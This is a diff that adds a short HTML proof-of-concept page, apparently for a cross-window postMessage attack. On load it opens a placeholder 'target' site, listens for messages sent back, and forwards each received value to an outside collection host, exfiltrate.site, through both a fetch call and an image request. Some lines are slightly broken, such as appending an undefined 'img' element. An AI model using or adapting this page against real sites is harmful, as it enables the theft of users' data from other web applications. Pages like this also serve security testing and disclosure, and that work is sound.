@@ -1,0 +1,27 @@
+<html>
+    <body>
+      
+      
+      <script>
+        function submitmessage(){
+            var win = window.open("http://target",'_blank');
+            
+        }        
+        
+        
+        window.addEventListener("message", function(event){
+            console.log(event.data.value);
+            fetch('https://exfiltrate.site/?data=' + event.data.value)
+            const newImg = document.createElement("img");
+            newImg.src = 'https://exfiltrate.site/?data=' + event.data.value;
+            document.getElementById('body').appendChild(img);
+            
+        }, false);
+        window.onload = submitmessage();
+        
+  
+    </script>  
+    </body>
+    
+    
+</html>
